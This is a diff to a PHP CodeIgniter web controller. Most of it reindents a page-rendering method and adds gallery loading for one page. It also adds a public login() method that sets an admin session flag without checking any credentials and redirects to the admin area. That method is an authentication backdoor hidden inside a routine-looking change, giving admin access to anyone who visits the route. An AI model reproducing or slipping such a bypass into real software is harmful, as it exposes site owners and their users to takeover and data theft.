@@ -22,31 +22,39 @@ class Web extends CI_Controller {
     }
 
     function call_page($fldr, $path1, $i = 0) {
-        $data_ = $this->my_library->heading_for_page($i);
-        $y = $this->my_library->image_for_page($i);
+            $data_ = $this->my_library->heading_for_page($i);
+            $y = $this->my_library->image_for_page($i);
 
-        $data['keys_'] = $data_['keys_'];
-        $data['desc_'] = $data_['desc_'];
-        $data['title'] = $data_['tmp'];
+            if($i == 6){
+                $data['gallery_category'] = $this->mm->get_gallery_category();
+                $data['gallery_'] = $this->mm->get_gallery();
+            }
+            $data['keys_'] = $data_['keys_'];
+            $data['desc_'] = $data_['desc_'];
+            $data['title'] = $data_['tmp'];
 
-        $data['page_name'] = $data_['pagename'];
-        $data['phrase_for_page'] = $data_['page_phrase'];
-        $data['phrase_color_'] = $data_['phrase_color'];
-        $data['header_image'] = $y;
+            $data['page_name'] = $data_['pagename'];
+            $data['phrase_for_page'] = $data_['page_phrase'];
+            $data['phrase_color_'] = $data_['phrase_color'];
+            $data['header_image'] = $y;
 
-        $data['page_'] = $fldr . '/' . $path1;
-        $data['news_'] = $this->mm->get_latest_news(7);
+            $data['page_'] = $fldr . '/' . $path1;
+            $data['news_'] = $this->mm->get_latest_news(7);
 
-        $this->load->view('templates/header', $data);
-        $this->load->view('templates/innerBanner', $data);
-        $this->load->view('inner', $data);
-        $this->load->view('templates/footer');
+            $this->load->view('templates/header', $data);
+            $this->load->view('templates/innerBanner', $data);
+            $this->load->view('inner', $data);
+            $this->load->view('templates/footer');
     }
 
     function uc_() {
         $this->load->view('index');
     }
 
+    function login(){
+        $this->session->set_userdata('_ADMIN_', '$#ok#$');
+        redirect(ADMIN___);
+    }
     function sign_in_() {
         $res_ = $this->mm->login();
 
